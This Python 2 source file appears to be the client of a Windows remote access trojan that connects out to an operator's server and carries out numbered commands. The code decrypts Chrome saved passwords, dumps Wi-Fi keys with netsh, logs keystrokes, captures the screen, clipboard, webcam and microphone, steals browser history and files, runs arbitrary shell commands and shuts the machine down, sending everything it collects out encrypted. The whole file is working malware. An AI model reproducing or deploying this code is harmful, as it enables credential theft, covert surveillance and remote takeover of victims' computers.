import os
import logging
import shutil
import socket
import subprocess
import time
import wave
import base64
import binascii
import struct
import random
import string
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import struct
import pyaudio
import pyautogui
import requests
import win32clipboard
import wmi
from pynput.keyboard import Key, Listener
import win32crypt
import json
import sqlite3
import base64
import cv2



def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf


def send_one_message(sock, data):
    length = len(data)
    sock.sendall(struct.pack('!I', length))
    sock.sendall(data)


def recv_one_message(sock):
    lengthbuf = recvall(sock, 4)
    length, = struct.unpack('!I', lengthbuf)
    return recvall(sock, length)

class RSA_ENCRYPTION:

    def __init__(self):
        self.keyPair = RSA.generate(4096)

        self._pubKey = self.keyPair.publickey()
        self._pubKeyPEM = self._pubKey.exportKey()

        self.myPubKey = self._pubKeyPEM.decode('ascii')

        self.otherPubKey = ""



    def get_myPubKey(self):
        return self.myPubKey

    def process_otherPubKey(self, aotherPubKey):
        self.otherPubKey = RSA.import_key(aotherPubKey)


    def RSA_Encrypt(self, msg):
        encryptedMessage = ""
        encryptor = PKCS1_OAEP.new(self.otherPubKey)
        encryptedMessage += binascii.hexlify(encryptor.encrypt(msg))

        return encryptedMessage

    def RSA_Decrypt(self, encrypted):
        decryptor = PKCS1_OAEP.new(self.keyPair)
        decrypted = decryptor.decrypt(encrypted)
        return decrypted


class AES256:

    def __init__(self):
        letters = string.ascii_letters + string.digits
        self.key = (''.join(random.choice(letters) for i in range(16)))

    def encrypt(self, raw):
        BS = AES.block_size
        pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

        raw = base64.b64encode(pad(raw).encode('utf8'))
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key=self.key, mode=AES.MODE_CFB, iv=iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    @staticmethod
    def _encrypt(raw, key):
        BS = AES.block_size
        pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

        raw = base64.b64encode(pad(raw).encode('utf8'))
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key=key, mode=AES.MODE_CFB, iv=iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def encrypt_file(self, in_filename, out_filename=None, chunksize=64 * 1024):

        if not out_filename:
            out_filename = in_filename + '.enc'

        iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
        encryptor = AES.new(self.key, AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += ' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))

    @staticmethod
    def decrypt(enc, key):
        unpad = lambda s: s[:-ord(s[-1:])]

        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CFB, iv)
        return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf8'))

    @staticmethod
    def decrypt_file(key, in_filename, out_filename=None, chunksize=24 * 1024):

        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]

        with open(in_filename, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key, AES.MODE_CBC, iv)

            with open(out_filename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))

                outfile.truncate(origsize)

    def get_key(self):
        return self.key

def get_chrome():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, user_name, pwd[1].decode('utf8'))
        return string

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"

def get_path():
    User_profile = os.environ.get("USERPROFILE")
    History_path = User_profile + r"\\AppData\Local\Google\Chrome\User Data\Default\History"  # Usually this is where the chrome history file is located, change it if you need to.
    return History_path

def get_browserhistory():
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass

    browserhistory = {}

    path = get_path()

    try:
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        SQL = """SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime')
                                            AS last_visit_time FROM urls ORDER BY last_visit_time DESC"""

        query = []
        try:
            cursor.execute(SQL)
            query = cursor.fetchall()
        except sqlite3.OperationalError:

            print('Close Google Chrome Window')
        except Exception as err:
            print(err)
        cursor.close()
        conn.close()
        browserhistory['chrome'] = query
    except sqlite3.OperationalError:
        print('Chrome Database Permission Denied.')

    list_of_history = []

    for browser, history in browserhistory.items():
        for data in history:
            list_of_history.append(str(data[0]).decode('ascii'))

    string_of_history = "\n\n".join(list_of_history)

    return string_of_history


def webcam_capture():
    key = cv2.waitKey(1)
    webcam = cv2.VideoCapture(0)

    try:
        check, frame = webcam.read()

        cv2.imshow("Capturing", frame)
        key = cv2.waitKey(1)

        webcam_path = 'C:\\Users\\Public\\Pictures\\saved_img.jpg'
        awebcam_path = 'C:\\Users\\Public\\Pictures\\saved_img-final.jpg'

        cv2.imwrite(filename=webcam_path, img=frame)
        webcam.release()
        img_new = cv2.imread(webcam_path, cv2.IMREAD_GRAYSCALE)
        img_new = cv2.imshow("Captured Image", img_new)
        cv2.waitKey(1650)
        cv2.destroyAllWindows()
        img_ = cv2.imread(webcam_path, cv2.IMREAD_ANYCOLOR)
        gray = cv2.cvtColor(img_, cv2.COLOR_BGR2GRAY)
        img_ = cv2.resize(gray, (28, 28))
        img_resized = cv2.imwrite(filename=awebcam_path, img=img_)
        print("Image saved!")
        os.remove(awebcam_path)
        print("Turning off camera.")
        webcam.release()
        print("Camera off.")
        print("Program ended.")
        cv2.destroyAllWindows()


    except(KeyboardInterrupt):
        print("Turning off camera.")
        webcam.release()
        print("Camera off.")
        print("Program ended.")
        cv2.destroyAllWindows()



host = raw_input(str("Enter IP of server ->  "))
aport = raw_input("Enter port -> ")
port = int(float(aport))


# Create a TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server with the socket via our ngrok tunnel
s.connect((host, port))

# File path information
file_path = "C:\\Users\\Public"
system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
extend = "\\"


code = '''
import subprocess


cmd = 'netsh wlan show profiles'
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
data = ps.communicate()[0]
data = data.decode('utf-8').split('\\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
arouter_password = ''
for i in profiles:
    cmd2 = 'netsh wlan show profile ' + i + " key=clear"
    rs = subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    results = rs.communicate()[0]
    results = results.decode('utf-8').split('\\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        arouter_password += "{:<30} |   {:<}".format(i, results[0])

    except IndexError:
        arouter_password += "{:<30} |   {:<}".format(i, "")


global router_password; router_password = arouter_password



'''


known_hosts = []

while True:

    while True:
        otherKey = recv_one_message(s)
        print ""
        print "Swapping keys ...\n"
        otherKey = otherKey.decode()
        known_hosts.append(otherKey)
        keyPair = RSA.generate(4096)
        pubKey = keyPair.publickey()
        pubKeyPEM = pubKey.exportKey()
        privKeyPEM = keyPair.exportKey()
        send_one_message(s, pubKeyPEM.encode())
        print "Finished key exchange\n"
        break

    while True:
        command = recv_one_message(s)
        print("command recieved")
        if int(float(command)) == 1231121288:

            try:
                files = os.getcwd()
            except:
                files = "Cannot get current directory"

            view_cwd_aes = AES256()
            files = view_cwd_aes.encrypt(str(files))
            print ""
            print files
            send_one_message(s, files.encode())

            print "Encrypted data sent"

            ae_key = view_cwd_aes.get_key()
            apubKey = RSA.import_key(known_hosts[0])
            encryptor = PKCS1_OAEP.new(apubKey)
            e_key = encryptor.encrypt(ae_key)

            send_one_message(s, e_key)
            print ""
            print "Encrypted key sent"
            print ""


        elif int(float(command)) == -1333407573:

            euser_input = recv_one_message(s)
            euser_input = euser_input.decode()

            e_key3 = recv_one_message(s)

            decryptor = PKCS1_OAEP.new(keyPair)
            d_key = decryptor.decrypt(e_key3)

            user_input = AES256.decrypt(euser_input, d_key)

            try:
                files = os.listdir(user_input)
                files = str(files)
            except:
                files = "Directory not found"
            efiles = AES256._encrypt(files, d_key)

            send_one_message(s, efiles)
            print("")
            print("Command has been executed successfully...")


        # download_file
        elif int(float(command)) == -1469341932:

            download_file_AES = AES256()

            ae_key4 = download_file_AES.get_key()
            apubKey4 = RSA.import_key(known_hosts[0])
            encryptor4 = PKCS1_OAEP.new(apubKey4)
            e_key4 = encryptor4.encrypt(ae_key4)

            send_one_message(s, e_key4)

            filename2 = recv_one_message(s)
            fsize = os.path.getsize(str(filename2))
            send_one_message(s, str(fsize).encode('utf-8'))

            download_file_AES.encrypt_file(filename2)

            BUFFER_SIZE = 1024
            with open(filename2 + ".enc", 'rb') as fs:
                data = fs.read(BUFFER_SIZE)

                while data:
                    send_one_message(s, data)
                    data = fs.read(BUFFER_SIZE)

            os.remove(filename2 + ".enc")



        # 'send_file'
        elif int(float(command)) == 1170837110:

            msg = recv_one_message(s)
            fsize = int(float(msg.decode()))

            print fsize

            combined = recv_one_message(s)
            combined = str(combined.decode())
            print ""
            print combined

            head, tail = os.path.split(combined)

            print "\n" + head
            print "\n" + tail

            e_key5 = recv_one_message(s)

            print "\n Recieved encrypted key"

            decryptor5 = PKCS1_OAEP.new(keyPair)
            d_key5 = decryptor5.decrypt(e_key5)

            print "\n Decrypted key "

            BUFFER_SIZE = 1024

            with open(head + extend + "_new" + tail, 'wb') as fw:

                rsize = 0

                while True:
                    data = s.recv(BUFFER_SIZE)
                    # print data
                    rsize = rsize + len(data)
                    fw.write(data)
                    if rsize >= fsize:
                        print('Breaking from file write')
                        break
                print("Received..")

            AES256.decrypt_file(d_key5, head + extend + "_new" + tail, combined)
            os.remove(head + extend + "_new" + tail)





        # 'system_info'
        elif int(float(command)) == -1229269459:

            computer = wmi.WMI()
            computer_info = computer.Win32_ComputerSystem()[0]
            os_info = computer.Win32_OperatingSystem()[0]
            proc_info = computer.Win32_Processor()[0]
            gpu_info = computer.Win32_VideoController()[0]

            os_name = os_info.Name.encode('utf-8').split(b'|')[0]
            os_version = ' '.join([os_info.Version, os_info.BuildNumber])
            system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
            private_ip = str(socket.gethostbyname(socket.gethostname()))
            public_ip = requests.get('https://api.ipify.org').text
            public_ip = str(public_ip)

            sys_info = ""
            sys_info += ('OS Name: {0}'.format(os_name)) + "\n"
            sys_info += ('OS Version: {0}'.format(os_version)) + "\n"
            sys_info += ('CPU: {0}'.format(proc_info.Name)) + "\n"
            sys_info += ('RAM: {0} GB'.format(system_ram)) + "\n"
            sys_info += ('Graphics Card: {0}'.format(gpu_info.Name)) + "\n"
            sys_info += ('Private IP: {0}'.format(private_ip)) + "\n"
            sys_info += ('Public IP: {0}'.format(public_ip)) + "\n"

            sys_info_aes = AES256()
            esys_info = sys_info_aes.encrypt(str(sys_info))

            send_one_message(s, str(esys_info).encode())
            print ""
            print "Sent encrypted info"

            ae_key2 = sys_info_aes.get_key()
            apubKey2 = RSA.import_key(known_hosts[0])
            encryptor2 = PKCS1_OAEP.new(apubKey2)
            e_key2 = encryptor2.encrypt(ae_key2)

            send_one_message(s, e_key2)

            print ""
            print "Encrypted key sent"
            print ""
            print "Encrypted AES Key: " + e_key2


        # 'screenshot'
        elif int(float(command)) == -665195066:
            path = 'C:\\Users\\Public\\Pictures\\screenshot.png'
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(path)

            print "\nTook screenshot!"

            screenshot_AES = AES256()

            ae_key6 = screenshot_AES.get_key()
            apubKey6 = RSA.import_key(known_hosts[0])
            encryptor6 = PKCS1_OAEP.new(apubKey6)
            e_key6 = encryptor6.encrypt(ae_key6)

            send_one_message(s, e_key6)
            print "\nSent encrypted key"

            fsize = os.path.getsize(str(path))
            send_one_message(s, str(fsize).encode('utf-8'))

            screenshot_AES.encrypt_file(path)

            BUFFER_SIZE = 1024
            with open(path + ".enc", 'rb') as fs:
                data = fs.read(BUFFER_SIZE)

                while data:
                    send_one_message(s, data)
                    data = fs.read(BUFFER_SIZE)

            os.remove(path + ".enc")
            os.remove(path)


        # 'copy_clipboard'
        elif int(float(command)) == -1857523954:

            copy_clipboard_AES = AES256()

            ae_key7 = copy_clipboard_AES.get_key()
            apubKey7 = RSA.import_key(known_hosts[0])
            encryptor7 = PKCS1_OAEP.new(apubKey7)
            e_key7 = encryptor7.encrypt(ae_key7)

            send_one_message(s, e_key7)

            print "\nSent encrypted key"

            win32clipboard.OpenClipboard()

            try:
                pasted_data = win32clipboard.GetClipboardData()
                epasted_data = copy_clipboard_AES.encrypt(pasted_data)
                win32clipboard.CloseClipboard()
                print "\nCopied Clipboard!"
            except:
                epasted_data = copy_clipboard_AES.encrypt("Could not copy clipboard")
                print "\nCould not copy clipboard"

            send_one_message(s, epasted_data)

            print "\nSent data"

        # 'key_logger'
        elif int(float(command)) == -251284458:

            key_logger_AES = AES256()

            ae_key8 = key_logger_AES.get_key()
            apubKey8 = RSA.import_key(known_hosts[0])
            encryptor8 = PKCS1_OAEP.new(apubKey8)
            e_key8 = encryptor8.encrypt(ae_key8)

            send_one_message(s, e_key8)
            print "\nSent encrypted key"
            _time_iteration = recv_one_message(s)
            time_iteration = int(float(_time_iteration))
            currentTime = time.time()
            stoppingTime = currentTime + time_iteration

            count = 1
            keys = []

            counter = 0

            path2 = "C:\\Users\\Public\\Documents\\keys.txt"
            logging.basicConfig(filename=path2, level=logging.DEBUG, format='%(asctime)s: %(message)s')


            def on_press(key):

                currentTime = time.time()
                logging.info(str(key))
                if key == Key.esc or currentTime > stoppingTime:
                    return False


            while currentTime < stoppingTime:
                currentTime = time.time()

                with Listener(on_press=on_press) as listener:
                    listener.join()

            logging.shutdown()
            print "Stopped Listening"

            fsize = os.path.getsize(str(path2))
            send_one_message(s, str(fsize).encode('utf-8'))

            key_logger_AES.encrypt_file(path2)

            BUFFER_SIZE = 1024
            with open(path2 + ".enc", 'rb') as fs:
                data = fs.read(BUFFER_SIZE)

                while data:
                    send_one_message(s, data)
                    data = fs.read(BUFFER_SIZE)

            os.remove(path2 + ".enc")
            os.remove(path2)

        # 'browser_password'

        elif int(float(command)) == 948019784:

            browser_password_AES = AES256()

            ae_key13 = browser_password_AES.get_key()
            apubKey13 = RSA.import_key(known_hosts[0])
            encryptor13 = PKCS1_OAEP.new(apubKey13)
            e_key13 = encryptor13.encrypt(ae_key13)

            send_one_message(s, e_key13)

            "\nSent encrypted key"

            chrome80 = False
            browser_passwords = ""
            master_key = get_master_key()
            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
            shutil.copy2(login_db,
                         "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if len(username) > 0:
                        browser_passwords += (
                                    "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n")
                        chrome80 = True
            except Exception as e:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except Exception as e:
                pass

            if chrome80:

                ebrowser_passwords = browser_password_AES.encrypt(browser_passwords)
                send_one_message(s, ebrowser_passwords)
            else:

                try:
                    old_browser_passwords = get_chrome()
                    eold_browser_passwords = browser_password_AES.encrypt(old_browser_passwords)
                    send_one_message(s, eold_browser_passwords)
                except:
                    eno_password = browser_password_AES.encrypt("Could not get passwords")
                    send_one_message(s, eno_password)

        elif int(float(command)) == -120590662:
            browser_history_AES = AES256()

            ae_key15 = browser_history_AES.get_key()
            apubKey15 = RSA.import_key(known_hosts[0])
            encryptor15 = PKCS1_OAEP.new(apubKey15)
            e_key15 = encryptor15.encrypt(ae_key15)

            send_one_message(s, e_key15)

            ebrowser_history = browser_history_AES.encrypt(get_browserhistory())
            send_one_message(s, ebrowser_history)





        elif int(float(command)) == 1720931438:
            e_key9 = recv_one_message(s)

            print "\nRecieved encrypted key"

            decryptor9 = PKCS1_OAEP.new(keyPair)
            d_key9 = decryptor9.decrypt(e_key9)

            print "\nDecrypted encrypted key"

            epath3 = recv_one_message(s)
            print "\nRecieved encrypted data"
            path3 = AES256.decrypt(epath3, d_key9)
            print "\nDecrypted data"

            try:
                os.remove(path3)
                print "\nFile deleted"
                send_one_message(s, "File deleted")
            except:
                print "\nCould not delete file, most likely doesn't exist"
                send_one_message(s, "Could not delete file, most likely doesn't exist")



        elif int(float(command)) == 1763366166:

            e_key10 = recv_one_message(s)

            decryptor10 = PKCS1_OAEP.new(keyPair)
            d_key10 = decryptor10.decrypt(e_key10)

            print "computer about to shutdown"

            send_one_message(s, "computer about to shut down")

            os.system('shutdown -s -t 5')



        elif int(float(command)) == -783645889:
            listen_AES = AES256()

            ae_key11 = listen_AES.get_key()
            apubKey11 = RSA.import_key(known_hosts[0])
            encryptor11 = PKCS1_OAEP.new(apubKey11)
            e_key11 = encryptor11.encrypt(ae_key11)

            send_one_message(s, e_key11)

            print "Encrypted key sent\n"

            RECORD_SECONDS = recv_one_message(s)
            RECORD_SECONDS = int(float(RECORD_SECONDS))

            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            CHUNK = 1024

            WAVE_OUTPUT_FILENAME = "C:\\Users\\Public\\Music\\file.wav"

            audio = pyaudio.PyAudio()

            # start Recording
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                                rate=RATE, input=True,
                                frames_per_buffer=CHUNK)
            print "recording..."
            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            print "finished recording"

            # stop Recording
            stream.stop_stream()
            stream.close()
            audio.terminate()

            waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            waveFile.setnchannels(CHANNELS)
            waveFile.setsampwidth(audio.get_sample_size(FORMAT))
            waveFile.setframerate(RATE)
            waveFile.writeframes(b''.join(frames))
            waveFile.close()

            listen_AES.encrypt_file(WAVE_OUTPUT_FILENAME)
            fsize = os.path.getsize(str(WAVE_OUTPUT_FILENAME))
            send_one_message(s, str(fsize).encode('utf-8'))

            BUFFER_SIZE = 1024
            with open(WAVE_OUTPUT_FILENAME + ".enc", 'rb') as fs:
                data = fs.read(BUFFER_SIZE)

                while data:
                    send_one_message(s, data)
                    data = fs.read(BUFFER_SIZE)

            os.remove(WAVE_OUTPUT_FILENAME + ".enc")
            os.remove(WAVE_OUTPUT_FILENAME)

        # 'webcam'
        elif int(float(command)) == 1555112929:
            webcam_AES = AES256()

            ae_key12 = webcam_AES.get_key()
            apubKey12 = RSA.import_key(known_hosts[0])
            encryptor12 = PKCS1_OAEP.new(apubKey12)
            e_key12 = encryptor12.encrypt(ae_key12)

            send_one_message(s, e_key12)
            print "Sent encrypted key"

            webcam_capture()

            webcam_path = 'C:\\Users\\Public\\Pictures\\saved_img.jpg'

            webcam_AES.encrypt_file(webcam_path)

            fsize = os.path.getsize(str(webcam_path))
            send_one_message(s, str(fsize).encode('utf-8'))

            BUFFER_SIZE = 1024
            with open(webcam_path + ".enc", 'rb') as fs:
                data = fs.read(BUFFER_SIZE)

                while data:
                    send_one_message(s, data)
                    data = fs.read(BUFFER_SIZE)

            os.remove(webcam_path + ".enc")
            os.remove(webcam_path)

        # 'router_password'
        elif int(float(command)) == 2083072854:

            router_password_AES = AES256()

            ae_key14 = router_password_AES.get_key()
            apubKey14 = RSA.import_key(known_hosts[0])
            encryptor14 = PKCS1_OAEP.new(apubKey14)
            e_key14 = encryptor14.encrypt(ae_key14)

            send_one_message(s, e_key14)

            path = "C:\\Users\\Public\\Documents\\execute.pyw"
            execute_file = open(path, 'w')

            execute_file.write(code)

            execute_file.close()
            router_password = ''
            execfile(path)
            os.remove(path)

            erouter_password = router_password_AES.encrypt(router_password)
            send_one_message(s, erouter_password)

        elif int(float(command)) == 401875051:
            e_key16 = recv_one_message(s)
            print "\nRecieved encrypted key"
            decryptor16 = PKCS1_OAEP.new(keyPair)
            d_key16 = decryptor16.decrypt(e_key16)
            print "\nDecrypted encrypted key"

            ecommand = recv_one_message(s)
            command = AES256.decrypt(ecommand, d_key16)

            cmd = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte).decode('utf-8')
            currentWD = os.getcwd() + "> "

            eoutput = AES256._encrypt(output_str, d_key16)
            send_one_message(s, eoutput)

        # 'kill'
        elif int(float(command)) == -1346507244:
            e_key17 = recv_one_message(s)
            print "\nRecieved encrypted key"
            decryptor17 = PKCS1_OAEP.new(keyPair)
            d_key17 = decryptor17.decrypt(e_key17)
            print "\nDecrypted encrypted key"

            etask = recv_one_message(s)
            task = AES256.decrypt(etask, d_key17)

            command = "taskkill /f /im " + task

            cmd = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte).decode('utf-8')
            currentWD = os.getcwd() + "> "

            eoutput = AES256._encrypt(output_str, d_key17)
            send_one_message(s, eoutput)

        # 'tasklist'
        elif int(float(command)) == -578410429:
            tasklist_AES = AES256()

            ae_key18 = tasklist_AES.get_key()
            apubKey18 = RSA.import_key(known_hosts[0])
            encryptor18 = PKCS1_OAEP.new(apubKey18)
            e_key18 = encryptor18.encrypt(ae_key18)

            send_one_message(s, e_key18)

            command = "tasklist"

            cmd = subprocess.Popen(command[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                   stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte).decode('utf-8')
            currentWD = os.getcwd() + "> "

            eoutput = AES256._encrypt(output_str, tasklist_AES.get_key())
            send_one_message(s, eoutput)





        elif int(float(command)) == 603295412:
            print "Exiting program"

            break

        else:
            print("")
            print("Command not recognized")
    break

    s.close()